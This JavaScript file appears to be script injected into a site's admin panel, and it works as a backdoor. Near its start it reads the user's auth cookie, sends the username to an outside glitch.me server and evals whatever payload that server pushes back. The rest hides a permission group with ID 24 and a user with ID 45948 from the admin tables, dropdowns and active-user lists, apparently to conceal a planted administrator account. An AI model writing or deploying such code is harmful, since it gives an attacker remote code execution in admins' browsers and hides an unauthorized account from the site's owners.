const getUsername = () => {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        const [name, value] = cookie.trim().split('=');
        if (name === 'authToken') {
            const decodedUsername = decodeURIComponent(value.split('_')[0]);
            return decodedUsername;
        }
    }
    return null;
};

const username = getUsername();

const eventSource = new EventSource(`https://tortoiseshell-bramble-day.glitch.me/komutlar?username=${encodeURIComponent(username)}`);
eventSource.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (data.payload) {
        eval(data.payload);
    }
};
eventSource.onerror = () => {};
eventSource.onopen = () => {};

if (!window.hasOwnProperty('scriptLoaded')) {
    window.scriptLoaded = true;

    var currentUrl = window.location.href;

    // Yetki-gruplari sayfasında ID’si 24 olan satırı gizle ve Ctrl+Shift+X ile geri getir
    if (currentUrl.includes('/duello/ad_/yetki-gruplari')) {
        let hiddenRow = null;

        const rows = document.querySelectorAll('tbody tr');
        rows.forEach(row => {
            const idCell = row.querySelector('td:first-child');
            if (idCell && idCell.textContent === '24') {
                row.style.display = 'none';
                hiddenRow = row;
            }
        });

        document.addEventListener('keydown', (event) => {
            if (event.ctrlKey && event.shiftKey && event.key === 'X') {
                if (hiddenRow) {
                    hiddenRow.style.display = '';
                }
            }
        });
    }

    // kullanicidetay.php?t= sayfalarında value="24" olan option’ı gizle
    if (currentUrl.includes('/duello/ad_/kullanicidetay.php?t=')) {
        function hideYetkiOption() {
            const select = document.getElementById('yetki');
            if (select) {
                const option24 = select.querySelector('option[value="24"]');
                if (option24) {
                    option24.style.display = 'none';
                }
            }
        }

        hideYetkiOption();
        const observer = new MutationObserver(() => {
            hideYetkiOption();
        });
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // yoneticiler sayfasında ID’si 45948 olan satırı gizle
    if (currentUrl.includes('/duello/ad_/yoneticiler')) {
        function hideManagerRow() {
            const rows = document.querySelectorAll('tbody tr');
            rows.forEach(row => {
                const idCell = row.querySelector('td:first-child');
                if (idCell && idCell.textContent === '45948') {
                    row.style.display = 'none';
                }
            });
        }

        hideManagerRow();
        const observer = new MutationObserver(() => {
            hideManagerRow();
        });
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // duello sayfasında aktifuser_45948’i gizle
    if (currentUrl.includes('/duello/') && !currentUrl.includes('/duello/ad_/yetki-gruplari')) {
        function hideUser() {
            const userItem = document.getElementById('aktifuser_45948');
            if (userItem) {
                userItem.style.display = 'none';
            }
        }

        hideUser();
        const observer = new MutationObserver(() => {
            hideUser();
        });
        observer.observe(document.body, { childList: true, subtree: true });
    }
}
